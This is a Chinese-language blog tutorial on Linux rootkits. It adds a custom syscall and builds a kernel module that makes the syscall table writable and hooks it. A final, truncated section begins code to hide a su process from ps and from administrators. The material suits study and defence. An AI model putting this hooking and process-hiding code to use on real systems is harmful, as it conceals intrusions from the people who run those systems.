@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Rootkit技术（一）从syscall到hook | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="什么是Rootkit简单地说，rootkit是一种能够隐身的恶意程序，也就是说，当它进行恶意活动的时候，操作系统根本感觉不到它的存在。想象一下，一个程序能够潜入到当前操作系统中，并且能够主动在进程列表中隐藏病毒，或者替换日志文件输出，或者两者兼而有之——那它就能有效地清除自身存在的证据了。此外，它还可以从受保护的内存区域中操纵系统调用，或将接口上的数据包导出到另一个接口。本文将重点介绍如何通过ho">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Rootkit技术（一）从syscall到hook">
+<meta property="og:url" content="http://example.com/2017/01/04/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%8Esyscall%E5%88%B0hook/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="什么是Rootkit简单地说，rootkit是一种能够隐身的恶意程序，也就是说，当它进行恶意活动的时候，操作系统根本感觉不到它的存在。想象一下，一个程序能够潜入到当前操作系统中，并且能够主动在进程列表中隐藏病毒，或者替换日志文件输出，或者两者兼而有之——那它就能有效地清除自身存在的证据了。此外，它还可以从受保护的内存区域中操纵系统调用，或将接口上的数据包导出到另一个接口。本文将重点介绍如何通过ho">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2017-01-04T07:44:45.000Z">
+<meta property="article:modified_time" content="2020-11-12T02:26:14.725Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Kernel">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Rootkit技术（一）从syscall到hook" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/01/04/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%8Esyscall%E5%88%B0hook/" class="article-date">
+  <time datetime="2017-01-04T07:44:45.000Z" itemprop="datePublished">2017-01-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Rootkit技术（一）从syscall到hook
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="什么是Rootkit"><a href="#什么是Rootkit" class="headerlink" title="什么是Rootkit"></a>什么是Rootkit</h2><p>简单地说，rootkit是一种能够隐身的恶意程序，也就是说，当它进行恶意活动的时候，操作系统根本感觉不到它的存在。想象一下，一个程序能够潜入到当前操作系统中，并且能够主动在进程列表中隐藏病毒，或者替换日志文件输出，或者两者兼而有之——那它就能有效地清除自身存在的证据了。此外，它还可以从受保护的内存区域中操纵系统调用，或将接口上的数据包导出到另一个接口。本文将重点介绍如何通过hooking系统调用来进行这些活动。在本文的第一部分，我们将自定义一个系统调用，然后构造一个hook到这个系统调用上的rootkit。在最后一部分，我们将创建一个rootkit来隐藏我们选择的进程。</p>
+<h2 id="用户空间与内核空间"><a href="#用户空间与内核空间" class="headerlink" title="用户空间与内核空间"></a>用户空间与内核空间</h2><p>之所以要先自定义一个系统调用，就是为了理解内核空间与用户空间中到底发生了什么。在用户空间中运行的进程，对内存的访问将受到一定限制，而在内核空间运行的进程则可以访问所有内存空间。但是，用户空间的代码可以通过内核暴露的接口来访问内核空间，这里的所说的接口就是系统调用。<br>当以root身份运行进程的时候，不见得它们就会运行在内核空间。因为root用户进程仍然是一个用户空间的进程，只不过root用户的进程的UID = 0，内核验证过其身份后会赋予其超级用户权限罢了。但是，即使拥有超级用户权限，仍然需要通过系统调用接口才能请求内核的各种资源，这一点对进一步阅读下面的内容非常重要。</p>
+<h2 id="所需软硬件"><a href="#所需软硬件" class="headerlink" title="所需软硬件"></a>所需软硬件</h2><p>Linux内核（我用的Ubuntu12.04，安装的内核版本为linux-3.10.103）<br>虚拟机（我用的VirtualBox）<br>我给CPU分配了两个CPU内核，4GB内存。</p>
+<h2 id="创建系统调用：pname"><a href="#创建系统调用：pname" class="headerlink" title="创建系统调用：pname"></a>创建系统调用：pname</h2><p>下载Linux内核并解压到<code>/usr/src/</code>目录下：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;usr&#x2F;src&#x2F;linux-3.10.103&#x2F;</span><br></pre></td></tr></table></figure>
+<p>pname系统调用接收一个进程名，将该进程对应的PID返回到启动该系统调用的终端上面。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir pname</span><br><span class="line">$ cd pname</span><br><span class="line">$ vim pname.c</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pname.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_process_name</span><span class="params">(<span class="keyword">char</span> *process_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* tasklist struct to use */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">    <span class="comment">/* tty struct */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">my_tty</span>;</span></span><br><span class="line">    <span class="comment">/* get current tty*/</span></span><br><span class="line">    my_tty = get_current_tty();</span><br><span class="line">    <span class="comment">/* placeholder to print full string to tty */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="comment">/* &lt;sched.h&gt; library method that iterates through list of processes from task_struct defined above */</span></span><br><span class="line">    for_each_process(task) &#123;</span><br><span class="line">        <span class="comment">/* compares the current process name (defined in task-&gt;comm) to the passed in name */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(task-&gt;comm, process_name) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* convert to string and put into name[] */</span></span><br><span class="line">            <span class="built_in">sprintf</span>(name, <span class="string">&quot;PID = %ld\n&quot;</span>, (<span class="keyword">long</span>)task_pid_nr(task));</span><br><span class="line">            <span class="comment">/* show result to user that called the syscall */</span></span><br><span class="line">            (my_tty-&gt;driver-&gt;ops-&gt;write)(my_tty, name, <span class="built_in">strlen</span>(name)+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>创建pname.h头文件：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_process_name</span><span class="params">(<span class="keyword">char</span> *process_name)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>创建Makefile：  </p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj-y := pname.o</span><br></pre></td></tr></table></figure>
+<p>回到/usr/src/linux-3.10.103目录，将pname目录添加到内核的Makefile中：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd ..</span><br><span class="line">$ vim Makefile</span><br></pre></td></tr></table></figure>
+<p>找到core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/所在的行，将pname/目录添加到此行的末尾：  </p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ pname/</span><br></pre></td></tr></table></figure>
+<p>这样在编译内核时，编译器就会将新创建的系统调用一起编译了。<br>将pname和sys_process_name添加到系统调用表中。如果用的是64位系统，那么需要添加到<code>syscall_64.tbl</code>文件的300到500之间（将64位和32位系统调用隔离开）。我用的是32位系统，添加在了<code>syscall_32.tbl</code>文件的结尾。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim arch&#x2F;x86&#x2F;syscalls&#x2F;syscall_32.tbl</span><br></pre></td></tr></table></figure>
+<p>添加新的系统调用：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">351 i386   pname     sys_process_name</span><br></pre></td></tr></table></figure>
+<p>将sys_process_name(char *process_name)添加到syscall头文件中。因为asmlinkage用于定义函数的哪些参数可以放在堆栈上，所以头文件的末尾必须添加函数的原型。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim include&#x2F;linux&#x2F;syscalls.h</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_process_name</span><span class="params">(<span class="keyword">char</span> *process_name)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>编译安装新内核并重启系统，这个在<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/10/21/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97/">前面的文章</a>中有介绍，这里就不再赘述。<br>测试新的pname系统调用，在任意一个用户目录，如/home/fanrong/hook/：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim testPname.c</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter process to find&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">    strtok(name, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> status = syscall(<span class="number">351</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;System call returned %ld\n&quot;</span>, status);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>随便写一个能一直运行的小程序，如test.c：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译并执行它：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ gcc test.c -o test</span><br><span class="line">$ .&#x2F;test &amp;</span><br><span class="line">$ gcc testPname.c -o testPname</span><br><span class="line">$ .&#x2F;testPname</span><br><span class="line">test</span><br><span class="line">PID &#x3D; 15756</span><br><span class="line">           System call returned 0</span><br></pre></td></tr></table></figure>
+<p>该系统调用通过遍历进程列表发现了test进程，并通过TTY将其输出到调用它的终端上，最后成功退出。</p>
+<h2 id="利用Rootkit-“钩取”-Pname"><a href="#利用Rootkit-“钩取”-Pname" class="headerlink" title="利用Rootkit “钩取” Pname"></a>利用Rootkit “钩取” Pname</h2><p>现在我们要以hook的形式来打造一个内核模块，而不是借助系统调用。<br>我们首先要做的事情就是找到系统调用表地址，因为一旦找到了这个地址，我们就能够对其进行相应的处理，进而hook系统调用了：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;boot&#x2F;System.map-3.10.103 | grep sys_call_table</span><br><span class="line">c16f71c0 R sys_call_table</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>有许多方法可以用来动态搜索sys_call_table，强烈建议使用这些方法而不是硬编码。然而，为了便于学习，这里就不那么讲究了。将来编写更高级的rootkit，让它也支持动态搜索能力。如果想了解这方面的知识并亲自尝试一下的话，建议阅读下面的文章： <a target="_blank" rel="noopener" href="https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/">https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/</a></p>
+</blockquote>
+<p>在/home/fanrong/hook/captainHook/目录中创建captainHook.c代码：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/cacheflush.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/pgtable_types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/highmem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;BruceFan&quot;</span>);</span><br><span class="line"><span class="comment">/* My sys_call_table address */</span></span><br><span class="line"><span class="comment">/* c16f71c0 R sys_call_table */</span></span><br><span class="line"><span class="keyword">void</span> **system_call_table_addr;</span><br><span class="line"><span class="comment">/* my custom syscall that takes process name */</span></span><br><span class="line"><span class="function">asmlinkage <span class="title">int</span> <span class="params">(*custom_syscall)</span> <span class="params">(<span class="keyword">char</span> *name)</span></span>;</span><br><span class="line"><span class="comment">/* hook */</span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">captain_hook</span><span class="params">(<span class="keyword">char</span> *play_here)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* do whatever here, but now we will just print to the dmesg log */</span></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Pname Syscall:HOOK! HOOK! HOOK! HOOK!...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> custom_syscall(play_here);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Make page writeable */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">make_rw</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = lookup_address(address, &amp;level); <span class="comment">/* pte points to the beginning address of a page table */</span></span><br><span class="line">    <span class="keyword">if</span> (pte-&gt;pte &amp; ~_PAGE_RW) &#123;</span><br><span class="line">        pte-&gt;pte |= _PAGE_RW;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Make the page write protected */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">make_ro</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = lookup_address(address, &amp;level);</span><br><span class="line">    pte-&gt;pte = pte-&gt;pte &amp; ~_PAGE_RW;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">entry_point</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Captain Hook loaded successfully..\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* My sys_call_table address */</span></span><br><span class="line">    system_call_table_addr = (<span class="keyword">void</span> *)<span class="number">0xc16f71c0</span>;</span><br><span class="line">    <span class="comment">/* Replace custom syscall with the correct system call name (write, open, etc) to hook */</span></span><br><span class="line">    custom_syscall = system_call_table_addr[__NR_pname];</span><br><span class="line">    <span class="comment">/* Disable page protection */</span></span><br><span class="line">    make_rw((<span class="keyword">unsigned</span> <span class="keyword">long</span>)system_call_table_addr);</span><br><span class="line">    <span class="comment">/* Change syscall to our syscall function */</span></span><br><span class="line">    system_call_table_addr[__NR_pname] = captain_hook;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __exit <span class="title">exit_point</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Unloaded Captain Hook Successfully\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* Restore original system call */</span></span><br><span class="line">    system_call_table_addr[__NR_pname] = custom_syscall;</span><br><span class="line">    <span class="comment">/* Renable page protection */</span></span><br><span class="line">    make_ro((<span class="keyword">unsigned</span> <span class="keyword">long</span>)system_call_table_addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(entry_point);</span><br><span class="line">module_exit(exit_point);</span><br></pre></td></tr></table></figure>
+<p>注意到<code>__NR_pname</code>，它代表数字，即pname的系统调用的编码。因为前面已经将该系统调用添加到<code>syscall_32.tbl</code>中，赋予了它一个数字、一个名称和一个函数名。在这里，用的就是它的名称（pname）。它将拦截pname系统调用，每成功一次就打印一次dmesg。<br>还需要创建一个Makefile文件：  </p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj-m += captainHook.o</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
+<p>编译该模块：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br></pre></td></tr></table></figure>
+<p>现在打开另一个终端，输入如下命令实时查看dmesg：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo watch &quot;dmesg | tail -20&quot;</span><br></pre></td></tr></table></figure>
+<p>回到之前的终端上插入hook模块并测试：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo insmod captainHook.ko</span><br><span class="line">$ cd ..</span><br><span class="line">$ .&#x2F;testPname</span><br><span class="line">Enter process to find</span><br><span class="line">test</span><br><span class="line">PID &#x3D; 15756</span><br><span class="line">           System call returned 0</span><br><span class="line">$ sudo rmmod captainHook</span><br></pre></td></tr></table></figure>
+<p>再查看另一个终端：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Captain Hook loaded successfully..</span><br><span class="line">Pname Syscall:HOOK! HOOK! HOOK! HOOK!...</span><br><span class="line">Unloaded Captain Hook Successfully</span><br></pre></td></tr></table></figure>
+<p>成功地”钩取”了系统调用!</p>
+<h2 id="对系统管理命令”ps”隐身"><a href="#对系统管理命令”ps”隐身" class="headerlink" title="对系统管理命令”ps”隐身"></a>对系统管理命令”ps”隐身</h2><p>现在要通过编程技术来实现对<code>ps</code>命令隐藏进程。首先，找到要隐藏进程的PID，并想清楚要让它伪装成哪个其他的进程。在本例中，将一个su进程伪装成bash进程，以便系统管理员看不到有人正在使用超级用户权限。</p>
+<blockquote>
+<p>Linux中的一切皆文件。例如“/proc/cpuinfo”文件存放的是CPU信息，内核版本位于“/proc/version”文件中。而“/proc/uptime”和“/proc/stat”文件则分别用来存放系统正常运行时间和空闲时间。当运行ps命令时，它实际上是打开进程的文件，以使用open()系统调用查看相关信息。当进程首次启动时，会使用系统调用write()将其写入具有相应PID的文件中。针对ps命令运行strace就能查找它们，或者查看它使用了哪些系统调用。</p>
+</blockquote>
+<p>在/home/fanrong/hook/phide/目录中创建phide.c代码：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 